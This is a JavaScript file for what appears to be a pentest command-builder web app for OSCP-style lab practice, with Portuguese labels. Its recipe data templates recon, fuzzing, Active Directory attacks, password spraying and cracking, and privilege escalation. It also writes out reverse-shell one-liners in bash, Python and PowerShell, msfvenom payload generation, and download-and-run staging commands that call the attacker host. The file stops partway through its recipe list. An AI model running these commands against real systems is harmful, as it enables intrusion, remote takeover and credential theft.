const STORE = {
  values: "pentestbench_values_v4",
  recipes: "pentestbench_recipes_v4",
  ws_log: "pentestbench_ws_log_v1",
  ws_check: "pentestbench_ws_check_v1",
  ws_creds: "pentestbench_ws_creds_v1",
  oscpStandalone: "pentestbench_oscp_standalone_v1",
  adChecklist: "pentestbench_oscp_ad_v1",
};

const els = {};

function cacheEls() {
  els.tabs = Array.from(document.querySelectorAll(".tab"));
  els.views = {
    commands: document.getElementById("view-commands"),
    workspace: document.getElementById("view-workspace"),
    cheatsheet: document.getElementById("view-cheatsheet"),
    oscp: document.getElementById("view-oscp"),
    adcheck: document.getElementById("view-adcheck")
  };

  els.profile = document.getElementById("profile");

  els.ip = document.getElementById("ip");
  els.port = document.getElementById("port");
  els.url = document.getElementById("url");
  els.http_code = "{http_code}";
  els.url_effective = "{url_effective}";
  els.domain = document.getElementById("domain");
  els.user = document.getElementById("user");
  els.pass = document.getElementById("pass");
  els.wordlist = document.getElementById("wordlist");
  els.hashfile = document.getElementById("hashfile");
  els.lhost = document.getElementById("lhost");
  els.lport = document.getElementById("lport");
  els.iface = document.getElementById("iface");
  els.proxy = document.getElementById("proxy");

  els.cmdSearch = document.getElementById("cmdSearch");
  els.btnClearSearch = document.getElementById("btnClearSearch");
  els.commandsContainer = document.getElementById("commandsContainer");
  els.quickTags = document.getElementById("quickTags");

  els.btnToggleAll = document.getElementById("btnToggleAll");
  els.btnResetAll = document.getElementById("btnResetAll");

  els.wsLog = document.getElementById("wsLog");
  els.wsChecklist = document.getElementById("wsChecklist");
  els.wsCreds = document.getElementById("wsCreds");
  els.btnWsInsertTs = document.getElementById("btnWsInsertTs");
  els.btnWsCopyMd = document.getElementById("btnWsCopyMd");
  els.btnWsExport = document.getElementById("btnWsExport");
  els.btnWsClear = document.getElementById("btnWsClear");

  els.cheatsContainer = document.getElementById("cheatsContainer");

  els.toast = document.getElementById("toast");

  els.oscpContainer = document.getElementById("oscpContainer");
  els.adContainer = document.getElementById("adContainer");

  els.oscpSlot = document.getElementById("oscpSlot");

  els.btnOscpExpandAll = document.getElementById("btnOscpExpandAll");
  els.btnOscpCollapseAll = document.getElementById("btnOscpCollapseAll");
  els.btnOscpReset = document.getElementById("btnOscpReset");

  els.btnAdExpandAll = document.getElementById("btnAdExpandAll");
  els.btnAdCollapseAll = document.getElementById("btnAdCollapseAll");
  els.btnAdReset = document.getElementById("btnAdReset");
}

function loadJSON(key, fallback) {
  try {
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : fallback;
  } catch {
    return fallback;
  }
}

function saveJSON(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function toast(msg) {
  if (!els.toast) return;
  els.toast.textContent = msg;
  els.toast.classList.add("show");
  window.clearTimeout(toast._t);
  toast._t = window.setTimeout(() => els.toast.classList.remove("show"), 1200);
}

async function copy(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast("Copiado.");
    return true;
  } catch {
    toast("Falha ao copiar.");
    return false;
  }
}

function escapeHtml(s) {
  return String(s ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll("\"", "&quot;")
    .replaceAll("'", "&#39;");
}

function pick(val, fallback) {
  const s = (val ?? "").toString().trim();
  return s ? s : fallback;
}

function getValues() {
  return {
    ip: els.ip.value.trim(),
    port: els.port.value.trim(),
    url: els.url.value.trim(),
    http_code: els.http_code.value.trim(),
    url_effective: els.url_effective.value.trim(),
    domain: els.domain.value.trim(),
    user: els.user.value.trim(),
    pass: els.pass.value.trim(),
    wordlist: els.wordlist.value.trim(),
    hashfile: els.hashfile.value.trim(),
    lhost: els.lhost.value.trim(),
    lport: els.lport.value.trim(),
    iface: els.iface.value.trim(),
    proxy: els.proxy.value.trim(),
    profile: els.profile.value
  };
}

function applyValues(v) {
  els.ip.value = pick(v.ip ?? els.ip.value, "10.10.10.10");
  els.port.value = pick(v.port ?? els.port.value, "443");
  els.url.value = pick(v.url ?? els.url.value, "");
  els.domain.value = pick(v.domain ?? els.domain.value, "corp.local");
  els.user.value = pick(v.user ?? els.user.value, "administrator");
  els.pass.value = pick(v.pass ?? els.pass.value, "Password123!");
  els.wordlist.value = pick(v.wordlist ?? els.wordlist.value, "/usr/share/wordlists/rockyou.txt");
  els.hashfile.value = pick(v.hashfile ?? els.hashfile.value, "/tmp/hashes.txt");
  els.lhost.value = pick(v.lhost ?? els.lhost.value, "10.10.14.5");
  els.lport.value = pick(v.lport ?? els.lport.value, "4444");
  els.iface.value = pick(v.iface ?? els.iface.value, "tun0");
  els.proxy.value = pick(v.proxy ?? els.proxy.value, "socks5://127.0.0.1:1080");
  els.profile.value = (v.profile ?? els.profile.value ?? "all");
}

function normalizeUrl(values) {
  if (values.url) return values.url;
  const host = values.ip || "";
  const port = values.port || "";
  if (!host) return "";
  if (!port || port === "80") return `http://${host}`;
  if (port === "443") return `https://${host}`;
  return `http://${host}:${port}`;
}

function computeDerived(values) {
  const url = normalizeUrl(values);
  return { ...values, url };
}

function renderCmdPlain(template, values) {
  return template.replace(/\{(\w+)\}/g, (_, k) => values[k] ?? "");
}

function renderCmdHighlightedSafe(template, values) {
  const parts = [];
  let last = 0;
  const re = /\{(\w+)\}/g;
  let m;

  while ((m = re.exec(template)) !== null) {
    parts.push(escapeHtml(template.slice(last, m.index)));
    const key = m[1];
    const val = values[key] ?? "";
    parts.push(`<span class="ph" title="${escapeHtml(key)}">${escapeHtml(val)}</span>`);
    last = m.index + m[0].length;
  }

  parts.push(escapeHtml(template.slice(last)));
  return parts.join("");
}

function toSpacedLinesHtml(multilineHtml) {
  const lines = String(multilineHtml ?? "").split("\n");
  return lines.map((l) => `<div class="codeLine">${l}</div>`).join("");
}

function applyCodeSpacingEl(codeEl) {
  codeEl.style.lineHeight = "1.85";
}

function stableAccentKey(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) h = ((h << 5) - h + str.charCodeAt(i)) | 0;
  const k = Math.abs(h) % 8;
  return ["A", "B", "C", "D", "E", "F", "G", "H"][k];
}

function snapshotOpenSections(containerEl) {
  const openKeys = new Set();
  if (!containerEl) return openKeys;

  containerEl.querySelectorAll(".section").forEach(sec => {
    if (sec.dataset.open === "true") {
      const k = sec.dataset.key || sec.querySelector(".sectionTitle")?.textContent?.trim() || "";
      openKeys.add(k);
    }
  });

  return openKeys;
}

function restoreOpenSections(containerEl, openSet) {
  if (!containerEl) return;

  containerEl.querySelectorAll(".section").forEach(sec => {
    const k = sec.dataset.key || sec.querySelector(".sectionTitle")?.textContent?.trim() || "";
    const shouldOpen = openSet.has(k);
    sec.dataset.open = shouldOpen ? "true" : "false";
    const body = sec.querySelector(".sectionBody");
    if (body) body.style.display = shouldOpen ? "grid" : "none";
  });
}

const DEFAULT_RECIPES = [
  {
    category: "Reconhecimento",
    icon: "ðŸ§­",
    profile: ["oscp", "web", "ad"],
    note: "Primeiro passe: identificar portas, serviÃ§os, versÃµes e caminhos Ã³bvios.",
    items: [
      {
        name: "Nmap baseline",
        tag: ["nmap", "recon", "scan"],
        note: "Escaneie full TCP. Depois rode scripts e versÃµes no set de portas encontrado.",
        steps: [
          { title: "Full TCP (rÃ¡pido)", cmd: "nmap -p- -Pn -T4 {ip} -oN nmap_ports.txt" },
          { title: "Full TCP (mais estÃ¡vel)", cmd: "nmap -p- -v -Pn -T3 {ip}" },
          { title: "Scripts + versÃµes (portas especÃ­ficas)", cmd: "nmap -sC -sV -Pn -p {port} {ip} -oN nmap_detail.txt" },
          { title: "Aggressive (quando fizer sentido)", cmd: "nmap -A -Pn -p {port} {ip}" },
          { title: "Salvar em arquivos", cmd: "nmap -p- -T4 -oA nmap_full {ip}\nnmap -sC -sV -p {port} -oA nmap_sv {ip}" },
          { title: "Bypass filters", cmd: "nmap -Pn -sV -g53 -D RND:30 -p{port} {ip} -oN nmap_versions.txt" }
        ]
      },
      {
        name: "UDP top ports",
        tag: ["nmap", "udp", "recon"],
        note: "UDP Ã© caro. Use top ports e ajuste conforme o cenÃ¡rio.",
        steps: [
          { title: "Top 200 UDP", cmd: "sudo nmap -sU --top-ports 200 -T4 {ip}" },
          { title: "Porta UDP especÃ­fica", cmd: "sudo nmap -sU -p {port} -sV {ip}" }
        ]
      },
      {
        name: "Quick service probes",
        tag: ["recon", "probe"],
        note: "Checagens rÃ¡pidas para entender banner e handshake.",
        steps: [
          { title: "HTTP headers", cmd: "curl -i -s {url} | head" },
          { title: "TLS info (se HTTPS)", cmd: "echo | openssl s_client -connect {ip}:{port} -servername {ip} 2>/dev/null | openssl x509 -noout -subject -issuer -dates" },
          { title: "Banner (nc)", cmd: "nc -nv {ip} {port}" }
        ]
      }
    ]
  },

  {
    category: "HTTP Web",
    icon: "ðŸŒ",
    profile: ["oscp", "web"],
    note: "Enum de conteÃºdo, parÃ¢metros, tech stack e vulnerabilidades comuns.",
    items: [
      {
        name: "Tech + headers",
        tag: ["web", "recon"],
        steps: [
          { title: "WhatWeb", cmd: "whatweb {url}" },
          { title: "Wappalyzer (manual)", cmd: "Use Wappalyzer no browser :)"} ,
          { title: "Robots + sitemap", cmd: "curl -s {url}/robots.txt\ncurl -s {url}/sitemap.xml | head" }
        ]
      },
      {
        name: "Directory and File fuzzing",
        tag: ["web", "fuzz", "ffuf"],
        note: "Ajuste -fc/-fs conforme respostas do alvo.",
        steps: [
          { title: "FFUF dir", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 50 -fc 404" },
          { title: "FFUF arquivos", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -t 50 -fc 404 -e php,asp,aspx,txt,html,js,jsp" },
          { title: "FFUF recursion (bÃ¡sico)", cmd: "ffuf -u {url}/FUZZ -w {wordlist} -recursion -recursion-depth 2 -t 80 -fc 404" },
          { title: "FFUF de diretÃ³rio com recursÃ£o (Ãºltimo recurso, wordlist muito grande)", cmd: "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -recursion -recursion-depth 1 -o dirs" },
          { title: "FFUF misto arquivo/diretÃ³rios", cmd: "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -recursion -recursion-depth 1" },
          { title: "FFUF equilibrado com wordlist menor", cmd: "ffuf -u {url}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 1" },
          { title: "FFUF arquvivos com wordlist", cmd: "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -e php,asp,aspx,jsp,html,txt,json -o files" }
        ]
      },
      {
        name: "VHost fuzzing",
        tag: ["web", "vhost", "ffuf"],
        note: "Ãštil quando hÃ¡ indicaÃ§Ã£o de mÃºltiplos hosts no mesmo IP.",
        steps: [
          { title: "FFUF Host header", cmd: "ffuf -u {url}/ -H \"Host: FUZZ.{domain}\" -w {wordlist} -fs 0" },
          { title: "FFUF subdomain (se tiver lista)", cmd: "ffuf -u {url}/ -H \"Host: FUZZ\" -w subdomains.txt -fs 0" }
        ]
      },
      {
        name: "Param discovery",
        tag: ["web", "params"],
        steps: [
          { title: "Arjun (GET)", cmd: "arjun -u {url} --get" },
          { title: "Arjun (com path)", cmd: "arjun -u {url}/PATH --get" },
          { title: "FFUF param", cmd: "ffuf -u {url}/page.php?FUZZ=test -w burp-parameter-names.txt" }
        ]
      },
      {
        name: "Nikto + Nuclei",
        tag: ["web", "scan"],
        steps: [
          { title: "Nikto", cmd: "nikto -h {url} -o nikto_scan.txt" },
          { title: "Nuclei (rÃ¡pido)", cmd: "nuclei -u {url} -severity low,medium,high,critical" }
        ]
      },
      {
        name: "Common web checks",
        tag: ["web", "manual"],
        note: "Checklist rÃ¡pida do que olhar antes de perder tempo fuzzando demais.",
        steps: [
          { title: "Paths comuns", cmd: "curl -s -o /dev/null -w \"%{http_code} %{url_effective}\\n\" {url}/admin {url}/login {url}/register {url}/upload {url}/api {url}/graphql" },
          { title: "Git exposed", cmd: "curl -s -o /dev/null -w \"%{http_code}\\n\" {url}/.git/HEAD" },
          { title: "Env/backup files", cmd: "curl -s -o /dev/null -w \"%{http_code}\\n\" {url}/.env\ncurl -s -o /dev/null -w \"%{http_code}\\n\" {url}/backup.zip\ncurl -s -o /dev/null -w \"%{http_code}\\n\" {url}/db.sql" }
        ]
      }
    ]
  },

  {
    category: "SMB",
    icon: "ðŸªŸ",
    profile: ["oscp", "ad"],
    note: "Enum de shares, usuÃ¡rios e acessos. Se der, valide leitura e escrita.",
    items: [
      {
        name: "Baseline enum",
        tag: ["smb", "enum"],
        steps: [
          { title: "smbclient list (anon)", cmd: "smbclient -L //{ip}/ -N" },
          { title: "smbclient list (auth)", cmd: "smbclient -L //{ip}/ -U \"{user}%{pass}\"" },
          { title: "SMB scripts (nmap)", cmd: "nmap -p 445 --script \"smb*\" {ip}" }
        ]
      },
      {
        name: "CrackMapExec quick",
        tag: ["smb", "cme", "enum"],
        steps: [
          { title: "Shares", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --shares" },
          { title: "Users (RPC)", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --users" },
          { title: "Pass policy", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\" --pass-pol" }
        ]
      },
      {
        name: "RID cycling",
        tag: ["smb", "enum", "rpc"],
        note: "Ãštil quando vocÃª tem creds fracos ou anon permitido.",
        steps: [
          { title: "rpcclient (conectar)", cmd: "rpcclient -U \"{user}%{pass}\" {ip}" },
          { title: "enumdomusers", cmd: "rpcclient -U \"{user}%{pass}\" {ip} -c \"enumdomusers\"" },
          { title: "queryuser RID", cmd: "rpcclient -U \"{user}%{pass}\" {ip} -c \"queryuser 0x1f4\"" }
        ]
      }
    ]
  },

  {
    category: "LDAP",
    icon: "ðŸ“š",
    profile: ["ad"],
    note: "LDAP ajuda a puxar usuÃ¡rios, grupos e infos do domÃ­nio.",
    items: [
      {
        name: "ldapsearch basics",
        tag: ["ldap", "ad", "enum"],
        steps: [
          { title: "Naming contexts", cmd: "ldapsearch -x -H ldap://{ip} -s base namingcontexts" },
          { title: "Users (se base DN conhecido)", cmd: "ldapsearch -x -H ldap://{ip} -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName | head -n 50" }
        ]
      }
    ]
  },

  {
    category: "Kerberos",
    icon: "ðŸŽ«",
    profile: ["ad"],
    note: "ASREPRoast e Kerberoast aparecem com frequÃªncia em labs estilo OSCP.",
    items: [
      {
        name: "ASREPRoast / Kerberoast",
        tag: ["ad", "kerberos", "impacket"],
        steps: [
          { title: "ASREPRoast (GetNPUsers)", cmd: "GetNPUsers.py {domain}/ -dc-ip {ip} -usersfile users.txt -no-pass" },
          { title: "Kerberoast (GetUserSPNs)", cmd: "GetUserSPNs.py {domain}/{user}:\"{pass}\" -dc-ip {ip} -request" }
        ]
      },
      {
        name: "Kerberos user enum",
        tag: ["ad", "kerberos", "enum"],
        steps: [
          { title: "kerbrute userenum", cmd: "kerbrute userenum --dc {ip} -d {domain} users.txt" }
        ]
      }
    ]
  },

  {
    category: "WinRM / RDP / SSH",
    icon: "ðŸ§·",
    profile: ["oscp", "ad"],
    note: "Acesso remoto e validaÃ§Ã£o rÃ¡pida de credenciais.",
    items: [
      {
        name: "SSH",
        tag: ["ssh", "access"],
        steps: [
          { title: "SSH login", cmd: "ssh {user}@{ip}" },
          { title: "SSH com porta", cmd: "ssh -p {port} {user}@{ip}" },
          { title: "SSH key", cmd: "ssh -i id_rsa {user}@{ip}" }
        ]
      },
      {
        name: "RDP",
        tag: ["rdp", "access"],
        steps: [
          { title: "xfreerdp (senha)", cmd: "xfreerdp /v:{ip} /u:{user} /p:\"{pass}\" /dynamic-resolution /cert:ignore" },
          { title: "xfreerdp (pass-the-hash)", cmd: "xfreerdp /v:{ip} /u:{user} /pth:{hashfile} /dynamic-resolution /cert:ignore" }
        ]
      },
      {
        name: "WinRM",
        tag: ["winrm", "access"],
        steps: [
          { title: "evil-winrm", cmd: "evil-winrm -i {ip} -u {user} -p \"{pass}\"" },
          { title: "evil-winrm (hash)", cmd: "evil-winrm -i {ip} -u {user} -H {hashfile}" }
        ]
      }
    ]
  },

  {
    category: "SQL",
    icon: "ðŸ—ƒï¸",
    profile: ["oscp", "web"],
    note: "Enum de banco e exploraÃ§Ã£o bÃ¡sica quando tiver credenciais ou injeÃ§Ã£o.",
    items: [
      {
        name: "MySQL",
        tag: ["sql", "mysql"],
        steps: [
          { title: "Login", cmd: "mysql -h {ip} -P {port} -u {user} -p" },
          { title: "Dump rÃ¡pido (se cred)", cmd: "mysqldump -h {ip} -u {user} -p --all-databases > dump.sql" }
        ]
      },
      {
        name: "MSSQL",
        tag: ["sql", "mssql"],
        steps: [
          { title: "impacket-mssqlclient", cmd: "mssqlclient.py {user}:\"{pass}\"@{ip}" },
          { title: "impacket-mssqlclient (windows auth)", cmd: "mssqlclient.py {domain}/{user}:\"{pass}\"@{ip} -windows-auth" }
        ]
      },
      {
        name: "PostgreSQL",
        tag: ["sql", "postgres"],
        steps: [
          { title: "psql", cmd: "psql -h {ip} -p {port} -U {user} -d postgres" },
          { title: "psql env (se necessÃ¡rio)", cmd: "PGPASSWORD=\"{pass}\" psql -h {ip} -p {port} -U {user} -d postgres" }
        ]
      },
      {
        name: "SQLMap",
        tag: ["sql", "sqlmap", "web"],
        note: "Use com cuidado no exame e prefira prova manual quando der.",
        steps: [
          { title: "Dump bÃ¡sico", cmd: "sqlmap -u \"{url}\" --batch --dbs" },
          { title: "Cookie", cmd: "sqlmap -u \"{url}\" --cookie=\"SESSION=...\" --batch --dbs" },
          { title: "Request file", cmd: "sqlmap -r request.txt --batch --dbs" }
        ]
      }
    ]
  },

  {
    category: "File Transfer",
    icon: "ðŸ“¦",
    profile: ["oscp", "web", "ad"],
    note: "Transfer rÃ¡pido. Sempre tenha 2 ou 3 rotas alternativas.",
    items: [
      {
        name: "HTTP server (Linux attacker)",
        tag: ["transfer", "http"],
        steps: [
          { title: "Python http.server", cmd: "python3 -m http.server {lport} --bind 0.0.0.0" },
          { title: "php -S", cmd: "php -S 0.0.0.0:{lport}" }
        ]
      },
      {
        name: "Download (Linux victim)",
        tag: ["transfer", "linux"],
        steps: [
          { title: "curl", cmd: "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE" },
          { title: "wget", cmd: "wget http://{lhost}:{lport}/FILE -O /tmp/FILE" }
        ]
      },
      {
        name: "Download (Windows victim)",
        tag: ["transfer", "windows"],
        steps: [
          { title: "certutil", cmd: "certutil -urlcache -split -f http://{lhost}:{lport}/FILE C:\\\\Windows\\\\Temp\\\\FILE" },
          { title: "PowerShell (iwr)", cmd: "powershell -c \"iwr http://{lhost}:{lport}/FILE -OutFile C:\\\\Windows\\\\Temp\\\\FILE\"" }
        ]
      },
      {
        name: "SMB share (attacker -> victim)",
        tag: ["transfer", "smb"],
        steps: [
          { title: "impacket-smbserver", cmd: "impacket-smbserver share . -smb2support -username {user} -password \"{pass}\"" },
          { title: "Windows copy from share", cmd: "copy \\\\{lhost}\\\\share\\\\FILE C:\\\\Windows\\\\Temp\\\\FILE" }
        ]
      }
    ]
  },

  {
    category: "Reverse Shells",
    icon: "ðŸ§¨",
    profile: ["oscp", "web"],
    note: "Varia por egress e tooling no target. Tenha alternativas.",
    items: [
      {
        name: "Listeners",
        tag: ["shell", "listener"],
        steps: [
          { title: "Netcat", cmd: "nc -lvnp {lport}" },
          { title: "rlwrap nc", cmd: "rlwrap nc -lvnp {lport}" },
          { title: "socat tty", cmd: "socat -d -d TCP-LISTEN:{lport},reuseaddr,fork STDOUT" }
        ]
      },
      {
        name: "Linux shells",
        tag: ["shell", "linux"],
        steps: [
          { title: "bash -i", cmd: "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" },
          { title: "mkfifo", cmd: "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc {lhost} {lport} > /tmp/s" },
          { title: "python", cmd: "python3 -c 'import os,socket,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'" }
        ]
      },
      {
        name: "Windows shells",
        tag: ["shell", "windows"],
        steps: [
          { title: "PowerShell TCP", cmd: "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String );$r2=$r+'PS '+(pwd).Path+'> ';$o=([text.encoding]::ASCII).GetBytes($r2);$s.Write($o,0,$o.Length);$s.Flush()}\"" }
        ]
      }
    ]
  },

  {
    category: "Linux PrivEsc",
    icon: "ðŸ§",
    profile: ["oscp"],
    note: "Enum, paths comuns, e abusos frequentes (sudo, suid, cron, capabilities).",
    items: [
      {
        name: "Stabilization & TTY",
        tag: ["linux", "tty", "privesc"],
        steps: [
          { title: "PTY spawn", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
          { title: "Full TTY (manual)", cmd: "export TERM=xterm\nstty raw -echo; fg\nstty rows 40 columns 160" }
        ]
      },
      {
        name: "Basic enum",
        tag: ["linux", "enum"],
        steps: [
          { title: "Who/ID/Kernel", cmd: "id\nwhoami\nuname -a\ncat /etc/os-release" },
          { title: "Processes/services", cmd: "ps aux\nss -tulpn\nsystemctl list-units --type=service --state=running | head" },
          { title: "Interesting files", cmd: "find / -maxdepth 3 -type f \\( -name \"*.bak\" -o -name \"*.old\" -o -name \"*.zip\" -o -name \"*.sql\" -o -name \"*.conf\" \\) 2>/dev/null | head -n 200" }
        ]
      },
      {
        name: "Sudo / SUID / Capabilities",
        tag: ["linux", "privesc"],
        steps: [
          { title: "sudo -l", cmd: "sudo -l" },
          { title: "SUID files", cmd: "find / -perm -4000 -type f 2>/dev/null" },
          { title: "Capabilities", cmd: "getcap -r / 2>/dev/null" }
        ]
      },
      {
        name: "Cron / timers",
        tag: ["linux", "cron", "privesc"],
        steps: [
          { title: "Crontab", cmd: "cat /etc/crontab\nls -la /etc/cron.*\ncrontab -l" },
          { title: "Systemd timers", cmd: "systemctl list-timers --all" }
        ]
      },
      {
        name: "Writable paths",
        tag: ["linux", "privesc"],
        steps: [
          { title: "Writable dirs", cmd: "find / -writable -type d 2>/dev/null | head -n 200" },
          { title: "PATH abuse quick check", cmd: "echo $PATH\nwhich -a sudo python bash sh" }
        ]
      }
    ]
  },

  {
    category: "Windows PrivEsc",
    icon: "ðŸªŸ",
    profile: ["oscp", "ad"],
    note: "Enum: privilÃ©gios, serviÃ§os, permissÃµes, configs, credenciais salvas.",
    items: [
      {
        name: "Host enum",
        tag: ["windows", "enum"],
        steps: [
          { title: "Systeminfo", cmd: "systeminfo" },
          { title: "Users/groups", cmd: "whoami\nwhoami /priv\nwhoami /groups\nnet user\nnet localgroup administrators" },
          { title: "Network", cmd: "ipconfig /all\nroute print\nnetstat -ano" }
        ]
      },
      {
        name: "Services + perms",
        tag: ["windows", "privesc", "services"],
        steps: [
          { title: "List services", cmd: "sc query type= service state= all" },
          { title: "Unquoted service path (check)", cmd: "wmic service get name,displayname,pathname,startmode | findstr /i \"Auto\" | findstr /i /v \"C:\\\\Windows\\\\\"" },
          { title: "Scheduled tasks", cmd: "schtasks /query /fo LIST /v" }
        ]
      },
      {
        name: "Cred hunting",
        tag: ["windows", "creds"],
        steps: [
          { title: "Saved creds", cmd: "cmdkey /list" },
          { title: "Unattend", cmd: "dir /s /b C:\\\\Windows\\\\Panther\\\\Unattend.xml C:\\\\Windows\\\\Panther\\\\Unattend\\\\Unattend.xml 2>nul" },
          { title: "Search passwords", cmd: "findstr /si password *.txt *.ini *.config *.xml *.yml 2>nul" }
        ]
      }
    ]
  },

  {
    category: "AD Toolkit",
    icon: "ðŸ§©",
    profile: ["ad"],
    note: "Colete, valide acessos e iterar rÃ¡pido. Ajuste conforme o domÃ­nio.",
    items: [
      {
        name: "BloodHound collection",
        tag: ["ad", "bloodhound"],
        steps: [
          { title: "bloodhound-python All", cmd: "bloodhound-python -d {domain} -u {user} -p \"{pass}\" -ns {ip} -c All" },
          { title: "SharpHound (se tiver exec)", cmd: "SharpHound.exe -c All" }
        ]
      },
      {
        name: "AD quick checks",
        tag: ["ad", "enum"],
        steps: [
          { title: "CME auth check", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\"" },
          { title: "LDAP naming contexts", cmd: "ldapsearch -x -H ldap://{ip} -s base namingcontexts" }
        ]
      }
    ]
  },
  {
  category: "Exploitation",
    icon: "ðŸ§¨",
    profile: ["oscp", "web", "ad"],
    note: "Fluxo: identificar versÃ£o, buscar exploit, validar, adaptar, executar com evidÃªncia.",
    items: [
      {
        name: "Searchsploit basics",
        tag: ["exploit", "searchsploit"],
        steps: [
          { title: "Buscar por serviÃ§o e versÃ£o", cmd: "searchsploit \"SERVICE\" \"VERSION\"" },
          { title: "Copiar exploit local", cmd: "searchsploit -m EXPLOIT_ID" },
          { title: "Inspecionar paths", cmd: "searchsploit -x EXPLOIT_ID" },
          { title: "Checar notas", cmd: "searchsploit -w EXPLOIT_ID" }
        ]
      },
      {
        name: "Common staging",
        tag: ["exploit", "staging"],
        note: "Quando vocÃª precisa subir binÃ¡rio ou script rapidamente.",
        steps: [
          { title: "Attacker HTTP server", cmd: "python3 -m http.server {lport} --bind 0.0.0.0" },
          { title: "Linux download curl", cmd: "curl -L http://{lhost}:{lport}/FILE -o /tmp/FILE" },
          { title: "Linux download wget", cmd: "wget http://{lhost}:{lport}/FILE -O /tmp/FILE" },
          { title: "Windows download iwr", cmd: "powershell -c \"iwr http://{lhost}:{lport}/FILE -OutFile C:\\\\Windows\\\\Temp\\\\FILE\"" },
          { title: "Windows download certutil", cmd: "certutil -urlcache -split -f http://{lhost}:{lport}/FILE C:\\\\Windows\\\\Temp\\\\FILE" }
        ]
      },
      {
        name: "MSFVenom quick payloads",
        tag: ["exploit", "msfvenom", "payload"],
        note: "Gere payloads de laboratÃ³rio. Ajuste conforme o cenÃ¡rio e egress.",
        steps: [
          { title: "Linux ELF reverse TCP", cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o rev.elf" },
          { title: "Windows EXE reverse TCP", cmd: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o rev.exe" },
          { title: "ASP.NET reverse TCP", cmd: "msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o rev.aspx" },
          { title: "PHP reverse TCP", cmd: "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o rev.php" }
        ]
      },
      {
        name: "Listeners",
        tag: ["exploit", "shell", "listener"],
        steps: [
          { title: "Netcat", cmd: "nc -lvnp {lport}" },
          { title: "rlwrap nc", cmd: "rlwrap nc -lvnp {lport}" },
          { title: "Multi handler (metasploit)", cmd: "msfconsole -q\nuse exploit/multi/handler\nset payload windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun -j" }
        ]
      }
    ]
  },

  {
    category: "Passwords & Cracking",
    icon: "ðŸ”‘",
    profile: ["oscp", "web", "ad"],
    note: "Ataques comuns: brute controlado, spray e cracking offline. Registre o que funcionou.",
    items: [
      {
        name: "Hydra basics",
        tag: ["crack", "hydra", "bruteforce"],
        note: "Brute com cuidado. Prefira listas curtas e resultados rÃ¡pidos.",
        steps: [
          { title: "SSH single user + wordlist", cmd: "hydra -l {user} -P {wordlist} ssh://{ip} -t 4 -V" },
          { title: "RDP single user + wordlist", cmd: "hydra -l {user} -P {wordlist} rdp://{ip} -t 4 -V" },
          { title: "HTTP basic auth", cmd: "hydra -l {user} -P {wordlist} {ip} http-get / -t 4 -V" }
        ]
      },
      {
        name: "John the Ripper",
        tag: ["crack", "john"],
        steps: [
          { title: "Crack bÃ¡sico", cmd: "john --wordlist={wordlist} {hashfile}" },
          { title: "Mostrar cracks", cmd: "john --show {hashfile}" },
          { title: "Format manual", cmd: "john --format=FORMAT --wordlist={wordlist} {hashfile}" }
        ]
      },
      {
        name: "Hashcat",
        tag: ["crack", "hashcat"],
        note: "Ajuste o modo -m conforme o tipo de hash.",
        steps: [
          { title: "Crack wordlist", cmd: "hashcat -m 0 -a 0 {hashfile} {wordlist} --force" },
          { title: "Mostrar cracks", cmd: "hashcat -m 0 --show {hashfile}" },
          { title: "Rule bÃ¡sica", cmd: "hashcat -m 0 -a 0 {hashfile} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force" }
        ]
      },
      {
        name: "AD password spraying",
        tag: ["ad", "spray", "cme", "kerberos"],
        note: "Spray controlado. Teste uma senha em vÃ¡rios usuÃ¡rios, nÃ£o o contrÃ¡rio.",
        steps: [
          { title: "kerbrute passwordspray", cmd: "kerbrute passwordspray --dc {ip} -d {domain} users.txt \"{pass}\"" },
          { title: "CME spray SMB", cmd: "crackmapexec smb {ip} -u users.txt -p \"{pass}\" --continue-on-success" },
          { title: "CME validate single", cmd: "crackmapexec smb {ip} -u {user} -p \"{pass}\"" }
        ]
      }
    ]
  },

  {
    category: "FTP",
    icon: "ðŸ“",
    profile: ["oscp", "web"],
    note: "Checar anon, listar, upload e arquivos interessantes.",
    items: [
      {
        name: "FTP enum",
        tag: ["ftp", "enum"],
        steps: [
          { title: "Nmap scripts", cmd: "nmap -p 21 -sV --script \"ftp*\" {ip}" },
          { title: "ftp client", cmd: "ftp {ip}" },
          { title: "Anon login", cmd: "ftp {ip}\nName: anonymous\nPassword: anonymous" }
        ]
      }
    ]
  },
